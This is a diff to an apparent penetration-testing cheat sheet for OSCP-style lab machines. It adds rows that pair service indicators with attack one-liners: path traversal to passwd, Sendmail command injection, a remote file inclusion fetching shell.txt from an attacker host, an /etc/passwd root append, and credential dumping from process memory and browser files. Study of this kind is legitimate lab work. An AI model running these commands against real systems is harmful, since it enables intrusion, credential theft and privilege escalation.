@@ -59,6 +59,13 @@ This matrix is designed for rapid triage. When you see a specific "indicator" or
 | **IIS AppCmd.exe Found** | `appcmd.exe list apppool /config` | Credential harvesting from AppPools [OSCPC] |
 | **C:\windows.old Dir** | `dir /s C:\windows.old\SAM` | Recover legacy SAM/SYSTEM hashes [OSCPC] |
 | **PS History found** | `type [Path]\ConsoleHost_history.txt` | Cleartext passwords/runas commands [OSCPC] |
+| **Vesta CP (Port 8083)**| `curl -k ... reset/index.php?code=../../passwd` | Unauthenticated LFI/RCE [OSCPC - Frankfurt] |
+| **SNMP nsExtendObjects**| `snmpwalk -v 2c -c public [IP] .1.3.6.1.4.1.8072.1.3`| Custom script parsing for passwords [OSCPC - Frankfurt] |
+| **Sendmail (ClamAV)** | `nc [IP] 25` -> `RCPT TO: <'|COMMAND'>` | Unauthenticated RCE (CVE-2007-4560) [ClamAV] |
+| **Exhibitor (8080)** | java.env script -> `$(command)` | Unauthenticated RCE [Pelican] |
+| **Sudo gcore** | `sudo gcore [PID]` -> strings dump | Credential harvesting from root procs [Pelican] |
+| **CS-Cart (Port 80)** | `?classes_dir=../../etc/passwd%00` | Unauthenticated LFI (EDB-48890) [PayDay] |
+| **SSH Kex Error** | Use `-o KexAlgorithms=+...` | Legacy SSH server (Debian/Ubuntu 2007-2010) |
 | **B64 in Web Comment** | `echo [B64] \| base64 -d > secret.png` | Hidden file discovery (Stego) |
 | **PNG File Header** | `zbarimg [file]` | Check for QR code content |
 | **Audio Spectrogram Morse**| `morse2ascii [file.wav]` | Extract hidden Morse credentials |
@@ -85,6 +92,10 @@ This matrix is designed for rapid triage. When you see a specific "indicator" or
 | **.mozilla Dir (Home)** | Exfil `logins.json` and `key4.db` -> Decrypt | Credential harvesting (Browser) [InsanityHosting] |
 | **Hidden .passwd file** | `cat /home/[USER]/.passwd` | Check home dirs for hidden credential files |
 | **Encrypted SSH Key** | `ssh2john id_rsa > hash` -> `john` | Found `id_rsa` with `Proc-Type: 4,ENCRYPTED` [EvilboxOne] |
+| **HP Power Manager (80)**| Shell via `hp_power_manager_filename` | Buffer Overflow (CVE-2011-4158) [Kevin] |
+| **MS09-050 (SMB)** | `exploit/windows/smb/ms09_050...` | SMBv2 negotiation vuln (CVE-2009-3103) [Internal] |
+| **RFI (image.php?img=)** | `img=http://[KALI_IP]/shell.txt` | Unauthenticated RCE [Snookums] |
+| **Writable /etc/passwd** | `echo 'root2:[HASH]...' >> /etc/passwd` | Immediate root privesc [Snookums] |
 
 ### 1.5. Post-Exploitation Tactics
 
